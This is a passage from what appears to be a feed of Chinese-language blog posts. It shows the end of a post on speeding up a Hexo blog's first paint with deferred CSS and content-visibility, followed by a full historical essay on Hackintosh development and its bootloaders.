src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-03</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\">\n<div class=\"license-title\">黑苹果的历史</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-09-02</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a 